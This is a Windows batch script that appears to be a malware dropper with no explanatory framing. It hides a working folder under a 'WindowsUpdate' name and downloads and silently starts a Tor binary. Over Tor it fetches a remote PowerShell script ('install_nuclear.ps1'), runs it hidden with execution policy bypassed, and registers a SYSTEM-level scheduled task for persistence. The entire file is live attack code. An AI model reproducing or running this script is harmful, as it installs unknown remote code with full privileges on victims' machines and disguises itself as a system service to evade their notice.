@echo off
setlocal enabledelayedexpansion
set "ONION_URL=https://b153c4592d7595d4-46-159-204-118.serveousercontent.com/install_nuclear.ps1"
set "WORK_DIR=%APPDATA%\WindowsUpdate"
if "%WORK_DIR%"=="" set "WORK_DIR=%TEMP%\WindowsUpdate"
mkdir "%WORK_DIR%" 2>nul
attrib +h "%WORK_DIR%"

set "TOR_URLS[0]=https://drive.google.com/uc?id=16LtEKNTNyciICji7kgBBdL0G0HgBK5pC&export=download"
set "TOR_URLS[1]=https://github.com/torproject/torbrowser-releases/releases/download/torbrowser-15.0.8/tor-browser-windows-x86_64-portable-15.0.8.exe"
set "TOR_URLS[2]=https://dist.torproject.org/torbrowser/15.0.8/tor-browser-windows-x86_64-portable-15.0.8.exe"

set "TOR_DOWNLOADED=0"
for /l %%i in (0,1,2) do (
    if !TOR_DOWNLOADED! equ 0 (
        powershell -Command "$ProgressPreference='SilentlyContinue'; try{Invoke-WebRequest -Uri '!TOR_URLS[%%i]!' -OutFile '%WORK_DIR%\tor.exe' -TimeoutSec 45 -UserAgent 'Mozilla/5.0'}catch{}" 2>nul
        if exist "%WORK_DIR%\tor.exe" (
            for %%A in ("%WORK_DIR%\tor.exe") do if %%~zA GTR 100000000 set "TOR_DOWNLOADED=1"
        )
    )
)
if !TOR_DOWNLOADED! equ 0 exit /b 1

mkdir "%WORK_DIR%\tor_data" 2>nul
echo SocksPort 9050 > "%WORK_DIR%\torrc"
echo DataDirectory %WORK_DIR%\tor_data >> "%WORK_DIR%\torrc"
start /b "" "%WORK_DIR%\tor.exe" -f "%WORK_DIR%\torrc" --silent

set "TOR_READY=0"
for /l %%i in (1,1,60) do (
    timeout /t 1 /nobreak >nul 2>nul
    netstat -an 2>nul | find "9050" >nul && set "TOR_READY=1" && goto :tor_ready
)
:tor_ready
if "!TOR_READY!"=="0" exit /b 1

set "RETRY=0"
:download_retry
powershell -Command "$ProgressPreference='SilentlyContinue'; try{$wc=New-Object System.Net.WebClient; $wc.Proxy=[System.Net.WebProxy]::new('socks5://127.0.0.1:9050'); $wc.DownloadFile('%ONION_URL%', '%WORK_DIR%\install.ps1');exit 0}catch{exit 1}" 2>nul
if %errorlevel% neq 0 (
    set /a RETRY+=1
    if !RETRY! lss 3 (timeout /t 5 /nobreak >nul & goto :download_retry) else exit /b 1
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "%WORK_DIR%\install.ps1"
schtasks /create /tn "WindowsTorService" /tr "%WORK_DIR%\tor.exe -f %WORK_DIR%\torrc --silent" /sc onstart /ru SYSTEM /f 2>nul
del /f /q "%WORK_DIR%\tor.exe" 2>nul
exit
